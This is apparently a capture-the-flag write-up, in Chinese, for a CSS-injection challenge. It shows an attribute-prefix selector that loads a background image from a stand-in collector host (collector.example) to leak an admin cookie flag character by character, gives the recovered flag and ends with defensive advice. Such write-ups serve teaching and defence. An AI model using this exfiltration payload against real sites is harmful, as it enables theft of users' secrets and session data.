# beautiful styles

## 题目简述

网站允许提交任意 CSS，管理员机器人随后带着 `admin_flag` Cookie 打开投稿页面。模板把 Cookie 值放进 `<input value="...">`，攻击者虽不能运行 JavaScript，却可用 CSS 属性选择器逐字符判断 flag 前缀，并通过条件加载外部资源形成盲泄露通道。

## 解题过程

管理员访问页面时，服务端渲染：

```html
<input id="flag" value="ADMIN_COOKIE_VALUE" />
<link href="/uploads/SUBMISSION_ID.css" rel="stylesheet" />
```

CSS 选择器 `[value^="prefix"]` 只会在属性值以指定前缀开头时匹配。匹配后设置一个远程背景资源，浏览器便会向攻击者控制的收集端发出请求：

```css
input[value^="grey{X"] {
  background-image: url("https://collector.example/leak?prefix=grey-X");
}
```

每次投稿可以为同一位置枚举候选字符，并为每个选择器使用不同的请求标记。提交后触发 `/judge/<submission_id>`，观察唯一收到的请求即可确定下一字符。把新字符追加到已知前缀后重复，直至匹配右花括号。

为避免缓存干扰，请求路径或查询值应随“位置与候选字符”变化。题面给出的字符范围可减少枚举量，但实际操作中把大小写字母和数字都纳入候选更稳妥。逐位恢复结果为：

```text
grey{X5S34RCH1fY0UC4NF1ND1T}
```

## 方法总结

CSS 即使没有脚本能力，也能依据 DOM 属性条件触发网络请求，构成 XS-Leak。敏感值不应出现在攻击者可控制样式所作用的 DOM 中；管理员机器人还应限制外连、隔离 Cookie 与投稿源，并通过严格 CSP 阻断任意资源加载。归档题解无需保留赛时 webhook，核心是“前缀选择器 + 条件请求”的可复现机制。
